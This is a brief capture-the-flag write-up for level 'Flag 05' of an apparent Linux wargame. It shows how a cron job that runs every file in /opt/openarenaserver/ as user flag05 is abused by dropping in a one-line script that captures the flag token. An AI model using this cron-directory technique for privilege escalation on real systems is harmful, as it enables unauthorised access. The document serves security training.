# Flag 05

- when logged in I had this msg "You have new mail.", so we have an email server here
- `cd /var/mail/ | ll`
- output: `-rw-r--r--+ 1 root mail  58 Feb 10 13:14 level05`

- `cat level05 `
- `*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`
- So exec the secipt /usr/sbin/openarenaserver every */2 * * * * -> At every 2nd minute. -> will try to cat the script

- `cat /usr/sbin/openarenaserver`
- 
``` shell
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

- The script exce all in the folder `/opt/openarenaserver/` and that remove them with the permission of flag05 user

- write a script `/opt/openarenaserver/sh.sh` that exec the getflag cmd and write the result at `/tmp/issam` file and wait 2 min au max.

- `echo "getflag > /tmp/issam" > /opt/openarenaserver/sh.sh`
- `cat /tmp/issam`
- `Check flag.Here is your token : viuaaale9huek52boumoomioc`